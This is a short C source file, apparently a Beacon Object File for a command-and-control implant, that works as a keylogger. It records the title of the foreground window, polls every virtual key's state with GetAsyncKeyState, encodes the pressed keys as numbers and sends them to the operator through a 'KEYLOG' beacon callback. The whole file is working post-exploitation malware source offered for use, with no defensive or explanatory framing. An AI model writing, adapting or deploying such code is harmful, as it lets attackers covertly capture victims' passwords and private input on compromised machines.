/*
 * Author:  Dhanush Arvind
 * Ported from gowdaC2
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT SHORT WINAPI USER32$GetAsyncKeyState(int);
DECLSPEC_IMPORT HWND  WINAPI USER32$GetForegroundWindow(void);
DECLSPEC_IMPORT int   WINAPI USER32$GetWindowTextA(HWND, LPSTR, int);

void go(char *args, int alen) {
    char title[256];
    int i;
    for (i = 0; i < (int)sizeof(title); i++) title[i] = 0;

    HWND fg = USER32$GetForegroundWindow();
    if (fg)
        USER32$GetWindowTextA(fg, title, sizeof(title) - 1);

    char keys[1300];
    int pos = 0;
    int count = 0;
    int vk;

    for (vk = 1; vk < 255; vk++) {
        SHORT state = USER32$GetAsyncKeyState(vk);
        if (state & 0x8000) {
            if (count > 0 && pos < 1280) keys[pos++] = ' ';
            if (vk >= 100) {
                keys[pos++] = '0' + (vk / 100);
                keys[pos++] = '0' + ((vk / 10) % 10);
                keys[pos++] = '0' + (vk % 10);
            } else if (vk >= 10) {
                keys[pos++] = '0' + (vk / 10);
                keys[pos++] = '0' + (vk % 10);
            } else {
                keys[pos++] = '0' + vk;
            }
            count++;
            if (pos >= 1280) break;
        }
    }
    keys[pos] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "KEYLOG:%s\n%s", title, keys);
}
